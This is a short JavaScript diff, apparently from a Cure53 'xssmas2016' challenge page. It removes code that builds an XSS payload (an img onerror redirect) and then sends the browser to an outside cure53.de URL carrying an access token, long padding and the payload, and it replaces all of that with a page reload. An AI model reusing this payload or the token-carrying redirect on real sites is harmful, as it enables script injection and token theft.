@@ -7,9 +7,4 @@ if ('serviceWorker' in navigator) {
   });
 };
 
-
-var text = "";
-for(var i = 0; i < 8100; i++) text += "X";
-var xss = "\"><img src=\\ onerror=\"(function(){location.href=\"https://xssmas2016.cure53.de\"});\">";
-
-	location.href = "http://xssmas2016.cure53.de/pathway?access_token=" + key + "&x=" + text + "#" + xss;
+location.reload();
